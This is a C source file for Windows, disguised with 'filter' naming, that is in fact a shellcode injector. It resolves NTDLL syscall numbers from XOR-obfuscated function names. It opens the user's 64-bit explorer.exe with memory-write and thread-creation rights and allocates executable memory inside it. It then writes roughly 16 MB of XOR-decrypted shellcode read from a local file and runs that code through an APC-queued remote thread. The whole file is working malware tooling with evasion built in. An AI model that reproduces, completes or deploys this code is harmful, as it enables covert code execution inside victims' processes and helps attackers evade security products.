#include "FilterFunctions.h"

#define FILTER_WAYS (PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION)
#define k 0xAA
#define CHUNK_SIZE 50
#define ARRAY_SIZE 32
#define MAX_BYTES_PER_LINE 32
#define MAX_LINES 12

 FILE* f = NULL;

 int OpenFilterFile(void)
 {
	 char FilterDir[MAX_PATH];
	 char FilterFile[MAX_PATH];

	 // Get the path of the running executable
	 GetModuleFileNameA(NULL, FilterDir, MAX_PATH);

	 // Remove the executable name to get the folder
	 char* last = strrchr(FilterDir, '\\');
	 if (last) *(last + 1) = '\0';

	 // Construct the full path to your file
	 snprintf(FilterFile, MAX_PATH, "%sFilter_Functions.dat", FilterDir);

	 f = fopen(FilterFile, "r"); // <<< use global f, no FILE* here
	 if (!f) {
		 return 1;
	 }

	 return 0; // success
 }


void CloseFilterFile() {
	if (f) {
		fclose(f);
		f = NULL;
	}
}


size_t TakeLine(unsigned char* buffer, size_t bufferSize) {
	if (!f || !buffer) return 0;

	char line[256];
	if (!fgets(line, sizeof(line), f)) return 0; // EOF

	size_t count = 0;
	char* token = strtok(line, " \t\n\r");
	while (token && count < bufferSize) {
		unsigned int byte;
		if (sscanf(token, "%x", &byte) == 1) {
			buffer[count++] = (unsigned char)byte;
		}
		token = strtok(NULL, " \t\n\r");
	}

	
	return count; // number of bytes parsed
}

DWORD Session() {
	ULONG sessionId = -1;
	PROCESS_SESSION_INFORMATION psi = { 0 };
	ULONG retLen = 0;
	if (Filter_GetInfo(GetCurrentProcess(), ProcessSessionInformation, &psi, sizeof(psi), &retLen) != STATUS_SUCCESS)
		return 0;
	return psi.SessionId;
}

HANDLE OpenFilter(DWORD pid) {
	CLIENT_ID CID = { (HANDLE)pid, NULL };
	OBJECT_ATTRIBUTES OA = { sizeof(OA),  NULL };

	HANDLE hProcess = NULL;
	NTSTATUS status = Filter_LoadImage(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &OA, &CID);
	if (status != STATUS_SUCCESS) return NULL;
	return hProcess;
}

BOOL Is64BitProcess(HANDLE hProcess) {
	PVOID isWow64 = NULL;
	NTSTATUS status = Filter_GetInfo(hProcess, ProcessWow64Information, &isWow64, sizeof(isWow64), NULL);
	if (status != STATUS_SUCCESS) return FALSE;

	return (isWow64 == NULL); // If NULL => Not WoW64 => 64-bit
}

DWORD GetMainAppId() {
	DWORD pid = 0;
	ULONG bufferSize = 0x10000;
	PVOID buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buffer) return 0;

	ULONG retLen = 0;
	while (Filter_GetSystemState(SystemProcessInformation, buffer, bufferSize, &retLen) == STATUS_INFO_LENGTH_MISMATCH) {
		VirtualFree(buffer, 0, MEM_RELEASE);
		bufferSize *= 2;
		buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!buffer) return 0;
	}

	DWORD mySession = Session();
	PSYSTEM_PROCESS_INFORMATION proc = (PSYSTEM_PROCESS_INFORMATION)buffer;

	while (TRUE) {
		if (proc->ImageName.Buffer != NULL) {
			WCHAR name[260] = { 0 };

			wcsncpy_s(name, 260, proc->ImageName.Buffer, proc->ImageName.Length / sizeof(WCHAR));

			if (_wcsicmp(name, L"explorer.exe") == 0 && proc->SessionId == mySession) {
				pid = (DWORD)(ULONG_PTR)proc->UniqueProcessId;

				HANDLE hProc = OpenFilter(pid);
				if (hProc) {
					if (Is64BitProcess(hProc)) {
						Filter_CloseJob(hProc);
						break; // Found 64-bit explorer.exe
					}
					Filter_CloseJob(hProc);
				}

			}
		}

		if (proc->NextEntryOffset == 0) break;
		proc = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)proc + proc->NextEntryOffset);
	}

	VirtualFree(buffer, 0, MEM_RELEASE);
	return pid;
}

FARPROC ResolveExport(HMODULE hmodule, const char* FunctionName)
{
	// 1. Get DOS Header
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hmodule;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return NULL;
	}



	// 2. Get NT Headers
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hmodule + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE)
	{
		return NULL;
	}


	// 3. Get Export Directory Virtual Address
	DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportRVA == 0)
	{
		return NULL;
	}


	// 4. Locate the Export Directory
	PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hmodule + exportRVA);

	// /5 Get Export Tables — Names, Ordinals, Functions
	DWORD* nameRVAs = (DWORD*)((BYTE*)hmodule + exportDir->AddressOfNames);
	WORD* ordinals = (WORD*)((BYTE*)hmodule + exportDir->AddressOfNameOrdinals);
	DWORD* functions = (DWORD*)((BYTE*)hmodule + exportDir->AddressOfFunctions);

	DWORD i;
	for (i = 0;i < exportDir->NumberOfNames;i++)
	{
		char* name = (char*)hmodule + nameRVAs[i];

		if (strcmp(name, FunctionName) == 0) {
			WORD ordinal = ordinals[i];
			DWORD funcRVA = functions[ordinal];
			return (FARPROC)((BYTE*)hmodule + funcRVA);
		}
	}
	return NULL;
}

LPVOID FilterProcessor(LPVOID lpParam) {
	SleepEx(INFINITE, TRUE);
	return NULL;
}

void FilterProcessorEnd() {}

VOID GetFunctionInfo(
	_In_  HMODULE systemLibHandle,
	_In_  LPCSTR FuncNameEnc,
	_Out_ PDWORD funcIndex,
	_Out_ PUINT_PTR funcAddrOffset,
	_In_ BYTE funcbyte,
	_In_  size_t FuncNameSize

) {	
	unsigned char funcName[64]; 

	// --- Decryption ---
	for (size_t i = 0; i < FuncNameSize; i++) {
		funcName[i] = FuncNameEnc[i] ^ funcbyte; 
	}
	funcName[FuncNameSize] = '\0'; 

	
	DWORD SyscallNumber = 0;
	UINT_PTR targetFuncAddr = NULL;
	UCHAR opcodeCheck[2] = { 0x0F, 0x05 };
    targetFuncAddr = (UINT_PTR)ResolveExport(systemLibHandle,(char*) funcName);
	if (targetFuncAddr == 0) {
		return;
	}

	SyscallNumber = ((PBYTE)(targetFuncAddr + 0x4))[0];
	*funcIndex = SyscallNumber;

	*funcAddrOffset = targetFuncAddr + 0x12;




	/* THIS I HAVE NO IDEA ABOUT */
	if (memcmp(opcodeCheck, (PVOID)*funcAddrOffset, sizeof(opcodeCheck)) == 0) {

		return;
	}

	else {
		
		return;
	}

	 // index of NtWriteVirtualMemory
	



}

bool FilterLoader(void)
{
	BOOL      State = TRUE;
	LPVOID    dataBlock = NULL;
	HANDLE    hThread = NULL;
	HANDLE    hProcess = NULL;
	HANDLE    hTransaction = NULL;
	HANDLE    hTransactedFile = NULL;
	HANDLE    hSection = NULL;
	HMODULE   systemLibHandle = NULL;
	DWORD     OldProtection = 0;
	NTSTATUS  operationResult = 0;


	unsigned char datatemp[MAX_BYTES_PER_LINE]; 
	size_t datasize = 0;
	char line[256];

	


	if (OpenFilterFile() != 0)
	{
		State = FALSE;
		goto CLEANUP;
	}
		


	const unsigned char data[12][32] = {
		{ 0x4E, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73 },
		{ 0x4E, 0x74, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79 },
		{ 0x4E, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79 },
		{ 0x4E, 0x74, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x45, 0x78 },
		{ 0x4E, 0x74, 0x57, 0x61, 0x69, 0x74, 0x46, 0x6F, 0x72, 0x53, 0x69, 0x6E, 0x67, 0x6C, 0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74 },
		{ 0x4E, 0x74, 0x46, 0x72, 0x65, 0x65, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79 },
		{ 0x4E, 0x74, 0x43, 0x6C, 0x6F, 0x73, 0x65 },
		{ 0x4E, 0x74, 0x52, 0x65, 0x73, 0x75, 0x6D, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64 },
		{ 0x4E, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64 },
		{ 0x4E, 0x74, 0x51, 0x75, 0x65, 0x75, 0x65, 0x41, 0x70, 0x63, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64 },
		{ 0x4E, 0x74, 0x51, 0x75, 0x65, 0x72, 0x79, 0x49, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73 },
		{ 0x4E, 0x74, 0x51, 0x75, 0x65, 0x72, 0x79, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x49, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E } 
	};
	BYTE filterbyte = 0x00;
	const size_t datasizes[12] = {
	13, 
	23, 
	20, 
	16, 
	21, 
	19, 
	7,  
	14, 
	12, 
	16, 
	25, 
	24  
	};

	
	
	systemLibHandle = GetModuleHandleW(L"NTDLL");

	if (NULL == systemLibHandle) {
		return FALSE;
	}


	datasize = TakeLine(datatemp, MAX_BYTES_PER_LINE);
	GetFunctionInfo(systemLibHandle, datatemp, &gSsn_Filter_LoadImage, &gStub_Filter_LoadImage, filterbyte, datasizes[0]);

	datasize = TakeLine(datatemp, MAX_BYTES_PER_LINE);
	GetFunctionInfo(systemLibHandle, datatemp, &gSsn_Filter_AllocateData, &gStub_Filter_AllocateData, filterbyte, datasizes[1]);
	datasize = TakeLine(datatemp, MAX_BYTES_PER_LINE);
	GetFunctionInfo(systemLibHandle, datatemp, &gSsn_Filter_ApplyEffect, &gStub_Filter_ApplyEffect, filterbyte, datasizes[2]);
	datasize = TakeLine(datatemp, MAX_BYTES_PER_LINE);
	GetFunctionInfo(systemLibHandle, datatemp, &gSsn_Filter_StartJob, &gStub_Filter_StartJob, filterbyte, datasizes[3]);
	datasize = TakeLine(datatemp, MAX_BYTES_PER_LINE);
	GetFunctionInfo(systemLibHandle, datatemp, &gSsn_Filter_WaitJob, &gStub_Filter_WaitJob, filterbyte, datasizes[4]);
	datasize = TakeLine(datatemp, MAX_BYTES_PER_LINE);
	GetFunctionInfo(systemLibHandle, datatemp, &gSsn_Filter_FreeData, &gStub_Filter_FreeData, filterbyte, datasizes[5]);
	datasize = TakeLine(datatemp, MAX_BYTES_PER_LINE);
	GetFunctionInfo(systemLibHandle, datatemp, &gSsn_Filter_CloseJob, &gStub_Filter_CloseJob, filterbyte, datasizes[6]);
	datasize = TakeLine(datatemp, MAX_BYTES_PER_LINE);
	GetFunctionInfo(systemLibHandle, datatemp, &gSsn_Filter_ResumeJob, &gStub_Filter_ResumeJob, filterbyte, datasizes[7]);
	datasize = TakeLine(datatemp, MAX_BYTES_PER_LINE);
	GetFunctionInfo(systemLibHandle, datatemp, &gSsn_Filter_OpenWorker, &gStub_Filter_OpenWorker, filterbyte, datasizes[8]);
	datasize = TakeLine(datatemp, MAX_BYTES_PER_LINE);
	GetFunctionInfo(systemLibHandle, datatemp, &gSsn_Filter_QueueTask, &gStub_Filter_QueueTask, filterbyte, datasizes[9]);
	datasize = TakeLine(datatemp, MAX_BYTES_PER_LINE);
	GetFunctionInfo(systemLibHandle, datatemp, &gSsn_Filter_GetInfo, &gStub_Filter_GetInfo, filterbyte, datasizes[10]);
	datasize = TakeLine(datatemp, MAX_BYTES_PER_LINE);
	GetFunctionInfo(systemLibHandle, datatemp, &gSsn_Filter_GetSystemState, &gStub_Filter_GetSystemState, filterbyte, datasizes[11]);


	CloseFilterFile();



	    
	/*=======> FIND FILTERS <=======*/
	unsigned long sessionId = GetMainAppId();
	CLIENT_ID clientInfo = { (HANDLE)sessionId, NULL };
	OBJECT_ATTRIBUTES attributes = { sizeof(attributes),  NULL };


	/*=======> START FILTERING <=======*/


	operationResult = Filter_LoadImage(&hProcess, FILTER_WAYS, &attributes, &clientInfo);
	if (operationResult != STATUS_SUCCESS)
	{

		State = FALSE;
		goto CLEANUP;
	}

	PBYTE data_start = (PBYTE)FilterProcessor;
	PBYTE data_end = (PBYTE)FilterProcessorEnd;

    SIZE_T data_length = (SIZE_T)(data_end - data_start);
	
	SIZE_T data_size = 16019265;
    
	size_t total_length = data_size + data_length;

	operationResult = Filter_AllocateData(hProcess, &dataBlock, 0, &total_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (operationResult != STATUS_SUCCESS)
	{
		
		State = FALSE;
		goto CLEANUP;
	}
				
	size_t byteswriten = 0;
	size_t bytescounter = 0;
	LPVOID remote_data_block = dataBlock;
	


	operationResult = Filter_ApplyEffect(hProcess, remote_data_block/*payload_remote_addr*/, data_start/*writable_payload*/, data_length, &byteswriten);
	if (operationResult != STATUS_SUCCESS)
	{
		State = FALSE;
		goto CLEANUP;
	}
	bytescounter += byteswriten;
	

	
	LPVOID remote_data_chunk = (PBYTE)dataBlock + data_length;

	



	char workingDir[MAX_PATH];
	char dataFile[MAX_PATH];

	// Get the path of the running executable
	GetModuleFileNameA(NULL, workingDir, MAX_PATH);

	// Remove the executable name to get the folder
	char* lastSlash = strrchr(workingDir, '\\');
	if (lastSlash) {
		*(lastSlash + 1) = '\0'; // keep the trailing backslash
	}

	// Construct the full path to your file
	snprintf(dataFile, MAX_PATH, "%sFilter_Data.txt", workingDir);

	





	// Open the shellcode file
	FILE* file = fopen(dataFile, "r");
	if (!file) {
		return FALSE;
	}


	SIZE_T offset = 0;
	size_t bytes_written = 0;
	BYTE temp[CHUNK_SIZE];

	while (offset < data_size) {
		SIZE_T this_chunk = (data_size - offset > CHUNK_SIZE) ? CHUNK_SIZE : (data_size - offset);

		// Read and parse bytes from file
		for (SIZE_T i = 0; i < this_chunk; i++) {
			unsigned int byte_val;

			// Skip unwanted characters until a hex byte is found
			int ret;
			do {
				ret = fscanf(file, " %x", &byte_val); // read a hex number
				int c = fgetc(file);                  // check next char
				if (c == ';') {                       // final terminator
					ungetc(c, file);                  // put it back to stop reading later if needed
					break;
				}
				// ignore commas and braces
				if (c != ',' && c != '{' && c != '}' && !isspace(c))
					ungetc(c, file); // put back actual content if not a separator
			} while (ret != 1);

			if (ret != 1) {
				fclose(file);
				State = FALSE;
				goto CLEANUP;
			}

			temp[i] = (BYTE)(byte_val ^ k); // XOR decrypt
		}

		// Write decrypted chunk to remote process
		operationResult = Filter_ApplyEffect(hProcess, (PBYTE)remote_data_chunk + offset, temp, this_chunk, &bytes_written);
		if (operationResult != STATUS_SUCCESS) {
			fclose(file);
			State = FALSE;
			goto CLEANUP;
		}
		
		offset += this_chunk;
	}

	fclose(file);


   


	

		

	operationResult = Filter_StartJob(&hThread, THREAD_ALL_ACCESS, &attributes, hProcess, remote_data_block, NULL, THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE, 0, 0, 0, NULL);
	if (operationResult != STATUS_SUCCESS)
	{
		State = FALSE;
		goto CLEANUP;
	}

	

	operationResult = Filter_QueueTask(hThread, remote_data_chunk,NULL,NULL, NULL);
	if (operationResult != STATUS_SUCCESS)
	{
		State = FALSE;
		goto CLEANUP;
	}




	operationResult = Filter_WaitJob(hThread, FALSE, NULL);
	if (operationResult != STATUS_SUCCESS)
	{
		State = FALSE;
		goto CLEANUP;
	}


	Filter_CloseJob(hProcess);
	Filter_CloseJob(hThread);



CLEANUP:

	if (hThread)
	{
		Filter_CloseJob(hThread);
	}

	if (hProcess)
	{
		Filter_CloseJob(hProcess);
	}

	return State;
}










